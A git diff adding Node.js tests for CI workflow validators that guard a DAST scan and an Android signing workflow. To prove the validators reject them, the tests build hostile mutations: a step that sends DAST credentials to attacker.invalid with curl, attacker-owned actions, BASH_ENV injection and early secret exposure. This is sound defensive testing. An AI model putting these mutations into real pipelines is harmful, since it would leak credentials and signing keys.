@@ -3,9 +3,12 @@ import { readFile } from 'node:fs/promises';
 import { dirname, resolve } from 'node:path';
 import test from 'node:test';
 import { fileURLToPath } from 'node:url';
+import { Script } from 'node:vm';
 import { parse } from 'yaml';
 
 import {
+  validateAndroidBuildWorkflow,
+  validateDastWorkflow,
   validateDisabledCloudRunPaths,
   validateGovernance,
   validateMongoIdentityRecovery,
@@ -20,10 +23,13 @@ import {
 
 const SCRIPT_DIR = dirname(fileURLToPath(import.meta.url));
 const REPO_ROOT = resolve(SCRIPT_DIR, '../../..');
-const readRepoFile = (path) => readFile(resolve(REPO_ROOT, path), 'utf8');
+const readRepoFile = async (path) =>
+  (await readFile(resolve(REPO_ROOT, path), 'utf8')).replace(/\r\n?/g, '\n');
 const [
   rawWorkflow,
   rawSecurityWorkflow,
+  rawDastWorkflow,
+  rawAndroidBuildWorkflow,
   branchProtection,
   pullRequestTemplate,
   releaseEvidenceTemplate,
@@ -43,6 +49,8 @@ const [
 ] = await Promise.all([
   readRepoFile('.github/workflows/deploy.yml'),
   readRepoFile('.github/workflows/security.yml'),
+  readRepoFile('.github/workflows/dast.yml'),
+  readRepoFile('.github/workflows/build-android.yml'),
   readRepoFile('.github/BRANCH_PROTECTION.md'),
   readRepoFile('.github/pull_request_template.md'),
   readRepoFile('.github/RELEASE_EVIDENCE_TEMPLATE.md'),
@@ -62,9 +70,406 @@ const [
 ]);
 
 const copyWorkflow = () => structuredClone(parse(rawWorkflow));
+const copyDastWorkflow = () => structuredClone(parse(rawDastWorkflow));
+const copyAndroidBuildWorkflow = () =>
+  structuredClone(parse(rawAndroidBuildWorkflow));
+
+test('accepts the reviewed updater with CRLF line endings', () => {
+  validateUpdateScript(updateScript.replace(/\r?\n/g, '\r\n'));
+});
+
+function runDastGuard(
+  targetUrl,
+  trustedOrigin,
+  allowedHosts = 'api-staging.menorah.me,portal.security-test.menorah.me',
+) {
+  const program = validateDastWorkflow(copyDastWorkflow(), rawDastWorkflow);
+  return new Script(program, { filename: 'dast-origin-guard.js' }).runInNewContext({
+    URL,
+    process: {
+      env: {
+        DAST_TARGET_URL: targetUrl,
+        DAST_TRUSTED_ORIGIN: trustedOrigin,
+        DAST_ALLOWED_HOSTS: allowedHosts,
+      },
+    },
+  });
+}
 
 test('accepts the repository read-only release readiness workflow', () => {
   validateWorkflow(copyWorkflow(), rawWorkflow);
+});
+
+test('accepts exact environment-owned staging and security-test DAST origins', () => {
+  assert.doesNotThrow(() =>
+    runDastGuard(
+      'https://api-staging.menorah.me',
+      'https://portal.security-test.menorah.me',
+    ),
+  );
+});
+
+test('rejects every known Menorah production host as either DAST origin', () => {
+  const productionHosts = [
+    'menorah.me',
+    'www.menorah.me',
+    'app.menorah.me',
+    'admin.menorah.me',
+    'counsellor.menorah.me',
+    'api.menorah.me',
+    'api-ios.menorah.me',
+    'api-android.menorah.me',
+    'api-web.menorah.me',
+    'api-admin.menorah.me',
+    'calls.menorah.me',
+    'vps.menorah.me',
+  ];
+
+  for (const hostname of productionHosts) {
+    assert.throws(() =>
+      runDastGuard(`https://${hostname}`, 'https://portal-staging.menorah.me'),
+    );
+    assert.throws(() =>
+      runDastGuard('https://api-staging.menorah.me', `https://${hostname}`),
+    );
+  }
+});
+
+test('rejects production-path, credential, query, fragment, and port DAST bypasses', () => {
+  const rejectedOrigins = [
+    'https://app.menorah.me/staging',
+    'https://user:password@api-staging.menorah.me',
+    'https://api-staging.menorah.me?target=production',
+    'https://api-staging.menorah.me#production',
+    'https://api-staging.menorah.me:8443',
+    'https://api-staging.menorah.me/',
+    'http://api-staging.menorah.me',
+    'https://stagingexample.menorah.me',
+  ];
+
+  for (const origin of rejectedOrigins) {
+    assert.throws(() =>
+      runDastGuard(origin, 'https://portal-staging.menorah.me'),
+    );
+    assert.throws(() =>
+      runDastGuard('https://api-staging.menorah.me', origin),
+    );
+  }
+});
+
+test('rejects staging-looking hosts outside the reviewed DAST allowlist', () => {
+  assert.throws(
+    () => runDastGuard(
+      'https://staging.attacker.example',
+      'https://portal.security-test.menorah.me',
+    ),
+    /not in DAST_ALLOWED_HOSTS/,
+  );
+  assert.throws(
+    () => runDastGuard(
+      'https://api-staging.menorah.me',
+      'https://portal.security-test.menorah.me',
+      'api-staging.menorah.me,app.menorah.me',
+    ),
+    /unsafe hostname/,
+  );
+  assert.throws(
+    () => runDastGuard(
+      'https://api-staging.menorah.me.',
+      'https://portal.security-test.menorah.me',
+      'api-staging.menorah.me.,portal.security-test.menorah.me',
+    ),
+  );
+});
+
+test('rejects weakening the authenticated DAST active scan', () => {
+  const weakened = rawDastWorkflow.replace(
+    'zap.sh -cmd -autorun /zap/wrk/zap.yml',
+    'zap.sh -cmd -quickurl "$DAST_TARGET_URL"',
+  );
+  assert.notEqual(weakened, rawDastWorkflow);
+  assert.throws(
+    () => validateDastWorkflow(parse(weakened), weakened),
+    /credential-bound command digest|authenticated ZAP active scan plan/,
+  );
+});
+
+test('rejects an automatic or credential-exfiltrating DAST mutation', () => {
+  const automatic = copyDastWorkflow();
+  automatic.on.push = { branches: ['main'] };
+  assert.throws(
+    () => validateDastWorkflow(automatic, rawDastWorkflow),
+    /scheduled\/manual only/,
+  );
+
+  const exfiltrating = copyDastWorkflow();
+  exfiltrating.jobs.zap.steps.splice(1, 0, {
+    name: 'Publish credentials',
+    run: 'curl -d \"$DAST_EMAIL:$DAST_PASSWORD\" https://attacker.invalid',
+  });
+  assert.throws(
+    () => validateDastWorkflow(exfiltrating, rawDastWorkflow),
+    /step order and credential boundary/,
+  );
+});
+
+test('rejects continue-on-error on the DAST job and pre-credential guards', () => {
+  const mutations = [
+    (workflow) => {
+      workflow.jobs.zap['continue-on-error'] = true;
+    },
+    (workflow) => {
+      workflow.jobs.zap.steps[1]['continue-on-error'] = true;
+    },
+    (workflow) => {
+      workflow.jobs.zap.steps[2]['continue-on-error'] = true;
+    },
+  ];
+
+  for (const mutate of mutations) {
+    const workflow = copyDastWorkflow();
+    mutate(workflow);
+    assert.throws(
+      () => validateDastWorkflow(workflow, rawDastWorkflow),
+      /must not use continue-on-error/,
+    );
+  }
+});
+
+test('rejects workflow-level environment and shell-default inheritance in DAST', () => {
+  const mutations = [
+    (workflow) => {
+      workflow.env = { BASH_ENV: '/tmp/unreviewed-dast-environment' };
+    },
+    (workflow) => {
+      workflow.defaults = { run: { shell: 'sh' } };
+    },
+  ];
+
+  for (const mutate of mutations) {
+    const workflow = copyDastWorkflow();
+    mutate(workflow);
+    assert.throws(
+      () => validateDastWorkflow(workflow, rawDastWorkflow),
+      /DAST workflow fields must remain exact/,
+    );
+  }
+});
+
+test('rejects an attacker-owned action even when the DAST action has a full SHA', () => {
+  const workflow = copyDastWorkflow();
+  workflow.jobs.zap.steps[0].uses =
+    'attacker/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0';
+
+  assert.throws(
+    () => validateDastWorkflow(workflow, rawDastWorkflow),
+    /must use the exact reviewed action/,
+  );
+});
+
+test('rejects unexpected DAST step environment, condition, and shell fields', () => {
+  const mutations = [
+    {
+      mutate: (step) => {
+        step.env = { DAST_PASSWORD_COPY: '$DAST_PASSWORD' };
+      },
+      message: /must not gain step-level environment values/,
+    },
+    {
+      mutate: (step) => {
+        step.if = 'always()';
+      },
+      message: /must retain its exact condition/,
+    },
+    {
+      mutate: (step) => {
+        step.shell = 'sh';
+      },
+      message: /must retain its exact shell/,
+    },
+  ];
+
+  for (const { mutate, message } of mutations) {
+    const workflow = copyDastWorkflow();
+    mutate(workflow.jobs.zap.steps[1]);
+    assert.throws(
+      () => validateDastWorkflow(workflow, rawDastWorkflow),
+      message,
+    );
+  }
+});
+
+test('rejects dot-form and bracket-form secret interpolation in DAST run commands', () => {
+  const secretReferences = [
+    '${{ secrets.DAST_PASSWORD }}',
+    "${{ secrets['DAST_PASSWORD'] }}",
+  ];
+
+  for (const reference of secretReferences) {
+    const workflow = copyDastWorkflow();
+    workflow.jobs.zap.steps[3].run += `\nprintf '%s' '${reference}'\n`;
+    assert.throws(
+      () => validateDastWorkflow(workflow, rawDastWorkflow),
+      /must not interpolate a secret directly in run/,
+    );
+  }
+});
+
+test('accepts the manual main-head-only Android signing workflow', () => {
+  validateAndroidBuildWorkflow(
+    copyAndroidBuildWorkflow(),
+    rawAndroidBuildWorkflow,
+  );
+});
+
+test('rejects Android signing of a SHA other than the dispatch main HEAD', () => {
+  const weakenedRaw = rawAndroidBuildWorkflow.replace(
+    'if [[ \"$GITHUB_TRIGGER_REF\" != \"refs/heads/main\" || \"$RELEASE_SHA\" != \"$GITHUB_TRIGGER_SHA\" ]]; then',
+    'if [[ \"$GITHUB_TRIGGER_REF\" != \"refs/heads/main\" ]]; then',
+  );
+  assert.notEqual(weakenedRaw, rawAndroidBuildWorkflow);
+  assert.throws(
+    () => validateAndroidBuildWorkflow(parse(weakenedRaw), weakenedRaw),
+    /input must equal the workflow-dispatch main HEAD/,
+  );
+});
+
+test('rejects moving Android signing secrets into an unreviewed step', () => {
+  const weakened = copyAndroidBuildWorkflow();
+  weakened.jobs.build.steps.splice(1, 0, {
+    name: 'Use signing secret early',
+    env: {
+      ANDROID_KEYSTORE_BASE64: '${{ secrets.ANDROID_KEYSTORE_BASE64 }}',
+    },
+    run: 'echo unsafe',
+  });
+  assert.throws(
+    () => validateAndroidBuildWorkflow(weakened, rawAndroidBuildWorkflow),
+    /step order and secret boundary/,
+  );
+});
+
+test('rejects continue-on-error on the Android signing job or any guard step', () => {
+  const mutations = [
+    (workflow) => {
+      workflow.jobs.build['continue-on-error'] = true;
+    },
+    (workflow) => {
+      workflow.jobs.build.steps[0]['continue-on-error'] = true;
+    },
+    (workflow) => {
+      workflow.jobs.build.steps[2]['continue-on-error'] = true;
+    },
+  ];
+
+  for (const mutate of mutations) {
+    const workflow = copyAndroidBuildWorkflow();
+    mutate(workflow);
+    assert.throws(
+      () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
+      /must not use continue-on-error/,
+    );
+  }
+});
+
+test('rejects workflow-level environment and shell-default inheritance in Android signing', () => {
+  const mutations = [
+    (workflow) => {
+      workflow.env = { BASH_ENV: '/tmp/unreviewed-android-environment' };
+    },
+    (workflow) => {
+      workflow.defaults = { run: { shell: 'sh' } };
+    },
+  ];
+
+  for (const mutate of mutations) {
+    const workflow = copyAndroidBuildWorkflow();
+    mutate(workflow);
+    assert.throws(
+      () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
+      /Android signing workflow fields must remain exact/,
+    );
+  }
+});
+
+test('rejects a comment-only or no-op Android release approval guard', () => {
+  const workflow = copyAndroidBuildWorkflow();
+  workflow.jobs.build.steps[0].run = [
+    '# ^[0-9a-f]{40}$',
+    '# "$GITHUB_TRIGGER_REF" != "refs/heads/main"',
+    '# "$RELEASE_SHA" != "$GITHUB_TRIGGER_SHA"',
+    '# "$ANDROID_RELEASE_SIGNING_READY" != "protected-main-only"',
+    'true',
+  ].join('\n');
+
+  assert.throws(
+    () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
+    /approved release guard command changed/,
+  );
+});
+
+test('rejects dot-form and bracket-form secret interpolation in Android run commands', () => {
+  const secretReferences = [
+    '${{ secrets.ANDROID_KEY_PASSWORD }}',
+    "${{ secrets['ANDROID_KEY_PASSWORD'] }}",
+  ];
+
+  for (const reference of secretReferences) {
+    const workflow = copyAndroidBuildWorkflow();
+    workflow.jobs.build.steps[5].run += `\nprintf '%s' '${reference}'\n`;
+    assert.throws(
+      () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
+      /must not interpolate a secret directly in run/,
+    );
+  }
+});
+
+test('rejects an attacker-owned action even when the Android action has a full SHA', () => {
+  const workflow = copyAndroidBuildWorkflow();
+  workflow.jobs.build.steps[1].uses =
+    'attacker/checkout@11bd71901bbe5b1630ceea73d27597364c9af683';
+
+  assert.throws(
+    () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
+    /must use the exact reviewed action/,
+  );
+});
+
+test('rejects unexpected Android step environment, condition, and shell fields', () => {
+  const mutations = [
+    {
+      index: 5,
+      mutate: (step) => {
+        step.env = {
+          EARLY_SECRET: "${{ secrets['ANDROID_KEYSTORE_PASSWORD'] }}",
+        };
+      },
+      message: /must retain its exact environment boundary/,
+    },
+    {
+      index: 7,
+      mutate: (step) => {
+        step.if = 'always()';
+      },
+      message: /must retain its exact condition/,
+    },
+    {
+      index: 0,
+      mutate: (step) => {
+        step.shell = 'sh';
+      },
+      message: /must not override its reviewed shell/,
+    },
+  ];
+
+  for (const { index, mutate, message } of mutations) {
+    const workflow = copyAndroidBuildWorkflow();
+    mutate(workflow.jobs.build.steps[index]);
+    assert.throws(
+      () => validateAndroidBuildWorkflow(workflow, rawAndroidBuildWorkflow),
+      message,
+    );
+  }
 });
 
 test('rejects a workflow that consumes a repository secret', () => {
